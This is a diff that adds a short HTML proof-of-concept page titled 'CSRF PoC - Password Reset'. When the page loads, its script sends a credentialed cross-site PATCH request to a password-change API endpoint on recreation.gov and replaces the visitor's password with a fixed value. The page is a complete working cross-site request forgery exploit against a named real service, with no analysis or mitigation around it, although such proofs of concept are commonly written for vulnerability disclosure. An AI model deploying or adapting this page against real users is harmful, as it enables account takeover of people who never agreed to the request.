@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF PoC - Password Reset</h1>
+    <script>
+      fetch("https://www.recreation.gov/api/accounts/account/password", {
+        method: "PATCH",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          old_password: "test1234",
+          new_password: "CSRFtest1234!"
+        })
+      });
+    </script>
+  </body>
+</html>
